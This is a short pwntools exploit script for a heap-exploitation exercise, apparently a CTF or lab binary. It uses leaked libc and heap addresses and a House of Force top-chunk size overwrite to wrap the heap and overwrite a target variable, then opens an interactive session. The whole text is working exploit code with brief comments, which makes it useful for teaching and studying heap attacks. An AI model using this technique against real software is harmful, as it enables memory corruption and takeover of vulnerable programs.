#!/usr/bin/python3
from pwn import *

# Set the terminal for debugging
context.terminal = ['alacritty', '-e']
elf = context.binary = ELF("./main")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Function to select the "malloc" option and send size & data.
def malloc(size, data):
    io.sendline(b"1")  # Send option to malloc as bytes
    io.sendafter(b"size: ", str(size).encode())  # Send size as bytes
    io.sendafter(b"data: ", data)  # Send data (already bytes)
    io.recvuntil(b"> ")  # Wait for prompt as bytes

def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

io.recvuntil(b"puts func address leak() > ")  # Read puts address as bytes
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts

io.recvuntil(b"heap address > ")  # Read heap address as bytes
heap = int(io.recvline().strip(), 16)
io.recvuntil(b"> ")  # Wait for prompt as bytes
io.timeout = 0.1  # Set timeout for receiving data


# Request a small chunk to overflow from.
# Fill the chunk's user data with garbage then overwrite the top chunk's size field with a large value.
malloc(24, b"Y"*24 + p64(0xffffffffffffffff))

# Make a very large request that spans the gap between the top chunk and the target data.
# The chunk allocated to service this request will wrap around the VA space.
malloc(delta((heap + 0x20), (elf.sym.target - 0x20)), "Y")

# Request another chunk; the first qword of its user data overlaps the target data.
malloc(24, "0xdeadbeef")

# Confirm the target data was overwritten.
io.sendthen("target: ", "2")
target_data = io.recvuntil("\n", True)
assert target_data == b"0xdeadbeef"
io.recvuntil("> ")

# =============================================================================

io.interactive()
